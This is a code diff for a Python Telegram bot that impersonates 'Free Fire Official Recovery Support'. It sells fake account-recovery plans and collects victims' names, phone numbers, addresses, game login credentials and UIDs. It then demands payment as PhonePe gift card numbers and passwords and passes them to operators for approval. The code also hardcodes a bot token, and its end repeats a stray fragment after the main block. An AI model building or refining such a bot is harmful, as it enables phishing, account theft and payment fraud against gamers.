@@ -4,16 +4,15 @@ import string
 import time
 from flask import Flask, request, jsonify
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 TOKEN = "9015143190:AAGaL2nkNpxlK6_1zutMDQdSU4YR6TNp1hk"
 bot = telebot.TeleBot(TOKEN, threaded=False)
 
 app = Flask(__name__)
 
-# Temporary storage for user states & session timestamps (Timeout control)
 user_states = {}
-SESSION_TIMEOUT = 900  # 15 minutes in seconds
+SESSION_TIMEOUT = 900  # 15 minutes
 
 def generate_ticket_id():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
@@ -26,7 +25,6 @@ def check_session_timeout(chat_id):
             return True
     return False
 
-# Webhook route for Telegram Bot messages
 @app.route('/webhook', methods=['POST'])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
@@ -38,10 +36,9 @@ def webhook():
     else:
         return 'Forbidden', 403
 
-# Basic home route
 @app.route('/')
 def index():
-    return "FF Recovery Bot is live and running 24/7 with Advanced Protection!"
+    return "FF Recovery Bot is live and running 24/7!"
 
 # 1. /start command -> Welcome Banner + T&C + Agree Button
 @bot.message_handler(commands=['start'])
@@ -52,12 +49,10 @@ def start_command(message):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("✅ Agree & Continue", callback_data="agree_tc"))
     
-    banner_url = "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=800" # Sample banner image
+    banner_url = "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=800"
     caption = (
         "🛡️ **Welcome to Free Fire Official Recovery Support** 🛡️\n\n"
-        "Please read and agree to our **Terms & Conditions** before proceeding with your account recovery.\n\n"
-        "• All submissions are securely processed.\n"
-        "• Accurate details ensure faster processing."
+        "Please read and agree to our **Terms & Conditions** before proceeding with your account recovery."
     )
     
     try:
@@ -65,11 +60,11 @@ def start_command(message):
     except Exception:
         bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)
 
-# 2. T&C Agree -> Service Needed Selection (Basic vs Premium)
+# 2. T&C Agree -> Service Needed Selection
 @bot.callback_query_handler(func=lambda call: call.data == "agree_tc")
 def agree_tc_callback(call):
+    bot.answer_callback_query(call.id)  # Turant answer dena zaroori hai taaki error na aaye
     chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id)
     
     markup = InlineKeyboardMarkup()
     markup.row(
@@ -88,8 +83,8 @@ def agree_tc_callback(call):
 # 3. Plan Selection & Duration Confirmation
 @bot.callback_query_handler(func=lambda call: call.data in ["plan_basic", "plan_premium"])
 def plan_selection_callback(call):
+    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
     chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id)
     
     is_premium = (call.data == "plan_premium")
     plan_name = "Premium Recovery" if is_premium else "Basic Recovery"
@@ -108,15 +103,13 @@ def plan_selection_callback(call):
         reply_markup=markup
     )
 
-# 4. Sub-Options & Pricing Display (Mail Unlink vs Unlink+Relink)
+# 4. Sub-Options & Pricing Display
 @bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_plan_"))
 def show_sub_options(call):
+    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
     chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id)
     
     is_premium = "premium" in call.data
-    
-    # Pricing logic
     p1_price = "₹1799" if is_premium else "₹1199"
     p2_price = "₹2499" if is_premium else "₹1799"
     
@@ -136,23 +129,18 @@ def show_sub_options(call):
         reply_markup=markup
     )
 
-# 5. Handle Sub-Option selection & start Data Collection Flow
+# 5. Handle Sub-Option selection
 @bot.callback_query_handler(func=lambda call: call.data.startswith("sub_"))
 def handle_sub_selection(call):
+    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
     chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id)
     
     parts = call.data.split("_")
-    sub_type = parts[1] # mail or relink
-    tier = parts[2]     # prem or basic
+    sub_type = parts[1]
+    tier = parts[2]
     
     service_name = "Mail Unlink" if sub_type == "mail" else "Unlink + Relink"
-    
-    # Determine price
-    if tier == "prem":
-        price = "1799" if sub_type == "mail" else "2499"
-    else:
-        price = "1199" if sub_type == "mail" else "1799"
+    price = "1799" if (tier == "prem" and sub_type == "mail") else ("2499" if tier == "prem" else ("1199" if sub_type == "mail" else "1799"))
         
     user_states[chat_id].update({
         "sub_option": service_name,
@@ -167,7 +155,7 @@ def handle_sub_selection(call):
         parse_mode="Markdown"
     )
 
-# 6. Step-by-Step Chat Data Collection (Web App simulation / chat flow)
+# 6. Step-by-Step Chat Data Collection
 @bot.message_handler(func=lambda message: message.chat.id in user_states and "step" in user_states[message.chat.id])
 def collect_user_details(message):
     chat_id = message.chat.id
@@ -202,11 +190,10 @@ def collect_user_details(message):
         )
         bot.send_message(chat_id, "🔐 Account ka **Login Method** select karein:", reply_markup=markup)
 
-# Login method selection callback
 @bot.callback_query_handler(func=lambda call: call.data.startswith("login_"))
 def handle_login_method(call):
+    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
     chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id)
     
     login_method = call.data.split("_")[1]
     if chat_id in user_states:
@@ -219,7 +206,6 @@ def handle_login_method(call):
             parse_mode="Markdown"
         )
 
-# Credentials & UID collection handler
 @bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_credentials")
 def handle_credentials(message):
     chat_id = message.chat.id
@@ -235,7 +221,6 @@ def handle_uid(message):
     
     data = user_states[chat_id]
     
-    # 7. Summary Screen & Correctness Confirmation
     summary_text = (
         "📋 **Review Your Details:**\n\n"
         f"👤 **Name:** {data.get('name')}\n"
@@ -254,7 +239,108 @@ def handle_uid(message):
     
     bot.send_message(chat_id, summary_text, parse_mode="Markdown", reply_markup=markup)
 
-# 8. Payment Screen (PhonePe Gift Card with Anti-Fraud Validation)
+# 7. Payment Screen
+@bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
+def proceed_to_payment(call):
+    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    chat_id = call.message.chat.id
+    
+    price = user_states.get(chat_id, {}).get("price", "0")
+    user_states[chat_id]["step"] = "get_gift_card"
+    
+    payment_prompt = (
+        f"💳 **PHONEPE GIFT CARD PAYMENT** 💳\n\n"
+        f"Total Amount Payable: **₹{price}**\n\n"
+        "Kripya PhonePe Gift Card ke zariye payment karein aur niche diye gaye format mein details bhejein:\n\n"
+        "Format: `GiftCardNumber:Password`"
+    )
+    bot.send_message(chat_id, payment_prompt, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_gift_card")
+def handle_gift_card(message):
+    chat_id = message.chat.id
+    gift_card_input = message.text.strip()
+    
+    if ":" not in gift_card_input or len(gift_card_input) < 10:
+        bot.send_message(chat_id, "❌ **Invalid Format!** Kripya sahi format mein enter karein:\n`GiftCardNumber:Password`", parse_mode="Markdown")
+        return
+
+    gc_parts = gift_card_input.split(":", 1)
+    gc_number = gc_parts[0].strip()
+    gc_pass = gc_parts[1].strip()
+
+    if not gc_number.isdigit() or len(gc_number) < 12:
+        bot.send_message(chat_id, "❌ **Verification Failed:** Gift Card number अमान्य (invalid) lag raha hai.", parse_mode="Markdown")
+        return
+
+    user_states[chat_id]["gift_card_no"] = gc_number
+    user_states[chat_id]["gift_card_pass"] = gc_pass
+    
+    ticket_id = f"FF-{generate_ticket_id()}"
+    data = user_states[chat_id]
+    username = message.from_user.username or message.from_user.first_name
+    
+    bot.send_message(chat_id, "⏳ **Details is under verification please wait till confirmation.**", parse_mode="Markdown")
+    
+    msg_basic_details = (
+        f"🚨 **New Recovery Request (Basic Info)**\n\n"
+        f"🎟️ **Ticket:** `{ticket_id}`\n"
+        f"👤 **User:** @{username} (`{chat_id}`)\n"
+        f"📛 **Name:** {data.get('name')}\n"
+        f"📱 **Mobile:** {data.get('mobile')}\n"
+        f"🏠 **Address:** {data.get('address')}\n"
+        f"🔐 **Login Method:** {data.get('login_method')}\n"
+        f"🔑 **Credentials:** `{data.get('credentials')}`\n"
+        f"🆔 **UID:** `{data.get('uid')}`"
+    )
+    
+    markup = InlineKeyboardMarkup()
+    markup.row(
+        InlineKeyboardButton("✅ Received", callback_data=f"pay_recv_{ticket_id}_{chat_id}"),
+        InlineKeyboardButton("❌ Not Received", callback_data=f"pay_notrecv_{ticket_id}_{chat_id}")
+    )
+    
+    msg_payment_details = (
+        f"💳 **New Payment Verification (Gift Card)**\n\n"
+        f"🎟️ **Ticket:** `{ticket_id}`\n"
+        f"💰 **Amount:** ₹{data.get('price')}\n"
+        f"🎁 **Gift Card No:** `{gc_number}`\n"
+        f"🔒 **Password:** `{gc_pass}`"
+    )
+    
+    bot.send_message(chat_id, msg_basic_details, parse_mode="Markdown")
+    bot.send_message(chat_id, msg_payment_details, parse_mode="Markdown", reply_markup=markup)
+    
+    if chat_id in user_states:
+        del user_states[chat_id]
+
+# 8. Admin Action Handler
+@bot.callback_query_handler(func=lambda call: call.data.startswith(("pay_recv_", "pay_notrecv_")))
+def handle_admin_payment_action(call):
+    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    data_parts = call.data.split("_")
+    action = data_parts[1]
+    ticket_id = data_parts[2]
+    target_chat_id = data_parts[3]
+
+    if action == "recv":
+        bot.send_message(
+            target_chat_id, 
+            "✅ Your payment is successfully received. Your mail Unlink as soon as possible when your mail is Unlink we will inform you . Have a Good Day.", 
+            parse_mode="Markdown"
+        )
+        bot.edit_message_text(f"✅ Payment Received & Approved (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    else:
+        bot.send_message(
+            target_chat_id, 
+            "❌ Aapka PhonePe Gift Card verification fail ho gaya hai ya payment match nahi hui hai. Kripya apne gift card details check karke dobara `/start` se submit karein.", 
+            parse_mode="Markdown"
+        )
+        bot.edit_message_text(f"❌ Payment Not Received / Rejected (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
+ Card with Anti-Fraud Validation)
 @bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
 def proceed_to_payment(call):
     chat_id = call.message.chat.id
